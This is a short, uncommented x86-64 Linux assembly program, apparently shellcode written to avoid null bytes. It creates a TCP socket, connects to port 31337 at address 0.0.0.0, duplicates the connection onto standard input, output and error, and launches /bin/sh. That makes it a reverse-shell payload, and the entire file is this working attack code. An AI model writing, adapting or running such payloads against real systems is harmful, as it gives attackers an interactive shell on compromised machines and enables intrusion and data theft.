
	.section .text
	.globl _start

_start:

	xorl	%eax,%eax
	movb	$0x29,%al
	xorl	%edi,%edi
	movb	$2,%dil
	xorl	%esi,%esi
	inc	%esi
	xorl	%edx,%edx
	syscall

	pushq	%rax

	xorl	%eax,%eax
	pushq	%rax
	movl	$0x697affff,%eax
	xorw	$0xfffd,%ax
	pushq	%rax

	xorl	%eax,%eax
	movb	$0x2a,%al
	movl	0x10(%rsp),%edi
	leaq	(%rsp),%rsi
	xorl	%edx,%edx
	movb	$0x10,%dl
	syscall

	xorl	%eax,%eax
	pushq	%rax
	jmp	.L0
.L1:
	xorl	%eax,%eax
	movb	$0x21,%al
	movl	0x18(%rsp),%edi
	movl	(%rsp),%esi
	syscall
	incl	(%rsp)
.L0:
	cmpb	$3,(%rsp)
	jl	.L1

	popq	%rdx
	xorl	%edx,%edx
	pushq	%rdx
	movq	$0x68732f2f6e69622f,%rax
	pushq	%rax
	movq	%rsp,%rdi
	pushq	%rdx
	movq	%rsp,%rdx
	pushq	%rdi
	movq	%rsp,%rsi
	xorl	%eax,%eax
	movb	$0x3b,%al
	syscall

	xorl	%edi,%edi
	xorl	%eax,%eax
	movb	$0x3c,%al
	syscall

